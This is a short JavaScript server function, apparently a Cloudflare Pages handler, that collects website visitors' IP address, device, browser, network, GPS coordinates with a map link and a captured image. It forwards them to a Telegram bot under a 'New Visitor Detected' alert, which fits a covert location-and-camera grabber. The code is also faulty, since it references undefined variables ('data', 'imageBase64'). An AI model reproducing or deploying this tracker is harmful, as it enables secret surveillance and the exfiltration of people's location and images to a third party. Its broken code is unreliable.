export async function onRequestPost({ request, env }) {

  const body = await request.json();
  const id = body.session_id;

  const ip = request.headers.get("CF-Connecting-IP");

  let session = await env.VISITOR_KV.get(id);
  session = session ? JSON.parse(session) : {};

  Object.assign(session, body, {
    ip,
    updated: new Date().toISOString()
  });

  await env.VISITOR_KV.put(id, JSON.stringify(session));

  if (body.event === "final") {
    await sendTelegram(env, session);
  }

  return new Response("ok");
}

async function sendTelegram(env, s) {

const text = `
📍 <b>New Visitor Detected</b>

🕒 Time: ${data.time}
🌐 IP: ${data.ip}
📱 Device: ${data.device}
💻 OS: ${data.os}
🌎 Browser: ${data.browser}

📡 Network: ${data.network}

📍 Location:
Lat: ${data.lat}
Lng: ${data.lng}

🔗 <a href="https://maps.google.com/?q=${data.lat},${data.lng}">Open Map</a>
`;
  await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
  method: "POST",
  body: new URLSearchParams({
    chat_id: env.CHAT_ID,
    photo: imageBase64,
    caption: text,
    parse_mode: "HTML"
  })
});
  
  if (s.image) {
    const blob = await (await fetch(s.image)).blob();
    const form = new FormData();
    form.append("chat_id", env.CHAT_ID);
    form.append("photo", blob);

    await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    });
  }
}
